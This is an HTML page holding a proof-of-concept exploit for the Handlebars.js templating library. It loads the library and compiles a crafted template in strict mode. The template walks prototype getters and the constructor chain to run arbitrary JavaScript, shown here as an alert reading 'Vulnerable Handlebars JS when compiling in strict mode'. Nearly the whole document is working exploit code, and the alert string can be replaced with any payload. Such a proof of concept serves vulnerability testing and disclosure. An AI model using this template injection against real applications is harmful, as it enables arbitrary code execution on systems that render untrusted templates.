<script src="https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js"></script> 
<script> 
// compile the template 
var s = ` 
{{#with (__lookupGetter__ "__proto__")}} 
{{#with (./constructor.getOwnPropertyDescriptor . "valueOf")}} 
{{#with ../constructor.prototype}} 
{{../../constructor.defineProperty . "hasOwnProperty" ..}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{#with "constructor"}} 
{{#with split}} 
{{pop (push "alert('Vulnerable Handlebars JS when compiling in strict mode');")}} 
{{#with .}} 
{{#with (concat (lookup join (slice 0 1)))}} 
{{#each (slice 2 3)}} 
{{#with (apply 0 ../..)}} 
{{.}} 
{{/with}} 
{{/each}} 
{{/with}} 
{{/with}} 
{{/with}} 
{{/with}} 
`;
var template = Handlebars.compile(s, { 
strict: true 
}); 
// execute the compiled template and print the output to the console console.log(template({})); 
</script>
